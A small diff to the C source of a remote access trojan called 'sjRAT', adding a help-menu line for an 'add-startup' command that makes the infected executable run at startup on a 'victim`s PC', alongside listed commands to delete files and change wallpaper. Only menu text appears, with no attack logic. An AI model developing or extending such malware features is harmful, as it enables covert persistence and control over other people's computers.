@@ -57,6 +57,7 @@ void help_menu()
     printf("play <file> - play music from file\n\n");
     printf("wallpaper <file> - set wallpaper on victim`s PC\n\n");
     printf("delete <file> - remove file from victim`s PC\n\n");
+    printf("add-startup - infected .exe file will run on startup on victim`s PC\n\n");
     printf("help - see this message\n\n");
     printf("exit - exit sjRAT and terminate client session\n\n");
     printf("=====================================\n");
